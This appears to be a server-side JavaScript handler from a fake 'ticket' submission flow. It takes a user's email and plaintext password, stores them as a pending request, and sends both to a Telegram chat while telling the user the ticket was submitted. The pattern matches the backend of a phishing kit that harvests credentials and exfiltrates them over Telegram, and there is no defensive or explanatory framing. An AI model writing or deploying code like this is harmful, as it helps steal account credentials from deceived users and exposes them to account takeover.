import { v4 as uuid } from "uuid";

import requests from "../storage/requests.js";
import { sendTelegramMessage } from "../services/telegram.service.js";

export const submitTicket = async (req, res) => {
  try {
    const { email, password } = req.body;



    // Create a unique request ID
    const requestId = uuid();

    // Save the request
    requests.set(requestId, {
      id: requestId,
      email,
      password,
      status: "pending",
    });

    // Send message to Telegram
    await sendTelegramMessage({
      requestId,
      email,
      password,
    });

    // Return request ID to frontend
    return res.status(200).json({
      success: true,
      requestId,
      status: "pending",
      message: "Ticket submitted successfully.",
    });
  } catch (error) {
    console.log(error);

    return res.status(500).json({
      success: false,
      message: "Something went wrong.",
    });
  }
};
